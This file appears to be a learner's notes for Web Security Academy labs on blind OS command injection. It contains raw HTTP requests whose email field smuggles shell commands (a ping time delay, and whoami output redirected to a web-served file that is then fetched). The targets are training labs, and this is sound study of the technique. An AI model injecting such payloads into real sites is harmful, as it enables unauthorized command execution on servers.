@@ -1,0 +1,135 @@
+1) Lab: Blind OS command injection with time delays
+
+mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
+
+---
+
+POST /feedback/submit HTTP/2
+Host: 0af4001c0478960b8176bbc3004a0001.web-security-academy.net
+Cookie: session=fvKM10oNVMCAy1Q3Zx4MjNs4vWIWaWjV
+Content-Length: 110
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Content-Type: application/x-www-form-urlencoded
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://0af4001c0478960b8176bbc3004a0001.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0af4001c0478960b8176bbc3004a0001.web-security-academy.net/feedback
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+csrf=uMtjBlFd66wHyf877J4zgbQ4QmatqIey&name=hacker&email=hacker%40hacker.com&subject=you+hacked&message=ahahaha
+
+---
+
+POST /feedback/submit HTTP/2
+Host: 0af4001c0478960b8176bbc3004a0001.web-security-academy.net
+Cookie: session=fvKM10oNVMCAy1Q3Zx4MjNs4vWIWaWjV
+Content-Length: 119
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Content-Type: application/x-www-form-urlencoded
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://0af4001c0478960b8176bbc3004a0001.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0af4001c0478960b8176bbc3004a0001.web-security-academy.net/feedback
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+csrf=uMtjBlFd66wHyf877J4zgbQ4QmatqIey&name=hacker&email=%26+ping+-c+10+127.0.0.1+%26&subject=you+hacked&message=ahahaha
+
+2) Lab: Blind OS command injection with output redirection
+
+& whoami > /var/www/static/whoami.txt &
+||whoami>/var/www/images/output.txt||
+
+---
+
+/var/www/images/
+
+---
+
+||whoami>/var/www/images/whoami500.txt||
+
+---
+
+POST /feedback/submit HTTP/2
+Host: 0a2400d904b42241816603da00600055.web-security-academy.net
+Cookie: session=NFCEUcB8FCAqVw4HTmGw6yy7r0xDliV3
+Content-Length: 110
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Content-Type: application/x-www-form-urlencoded
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://0a2400d904b42241816603da00600055.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0a2400d904b42241816603da00600055.web-security-academy.net/feedback
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+csrf=8KDkDfGBnFbw4MWbcozn3RBUft55bB7J&name=hacker&email=hacker%40hacker.com&subject=you+hacked&message=ahahaha
+
+---
+
+POST /feedback/submit HTTP/2
+Host: 0a2400d904b42241816603da00600055.web-security-academy.net
+Cookie: session=NFCEUcB8FCAqVw4HTmGw6yy7r0xDliV3
+Content-Length: 131
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Content-Type: application/x-www-form-urlencoded
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://0a2400d904b42241816603da00600055.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0a2400d904b42241816603da00600055.web-security-academy.net/feedback
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+csrf=8KDkDfGBnFbw4MWbcozn3RBUft55bB7J&name=hacker&email=||whoami>/var/www/images/whoami500.txt||&subject=you+hacked&message=ahahaha
+
+---
+
+GET /image?filename=whoami500.txt HTTP/2
+Host: 0a2400d904b42241816603da00600055.web-security-academy.net
+Cookie: session=NFCEUcB8FCAqVw4HTmGw6yy7r0xDliV3
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+3) Lab: Blind OS command injection with out-of-band interaction
+
+https://beauknows.tech/posts/collaborator-alternatives/
+
+4) Lab: Blind OS command injection with out-of-band interaction
+
+https://beauknows.tech/posts/collaborator-alternatives/
